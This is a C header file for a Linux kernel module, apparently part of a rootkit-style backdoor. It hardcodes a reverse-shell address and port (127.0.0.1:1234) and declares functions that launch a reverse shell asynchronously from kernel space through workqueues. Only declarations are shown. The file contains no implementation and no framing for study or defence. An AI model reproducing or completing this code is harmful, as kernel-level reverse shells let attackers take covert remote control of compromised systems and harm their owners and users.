#include <linux/kernel.h>
#include <linux/workqueue.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>

#define REVERSE_SHELL_IP "127.0.0.1"
#define REVERSE_SHELL_PORT "1234"

struct shell_params {
	struct work_struct work;
	char* target_ip;
	char* target_port;
};


/**
 * Auxiliary function called by the workqueue which starts the reverse shell
 */ 
void execute_reverse_shell(struct work_struct *work);


/**
 * Starts reverse shell using kernel workqueues, which will run asynchronously
 * @param ip remote IP address to bind
 * @param port remote port to bind
 * @return 0 if OK, 1 if error 
 */ 
int start_reverse_shell(char* ip, char* port);


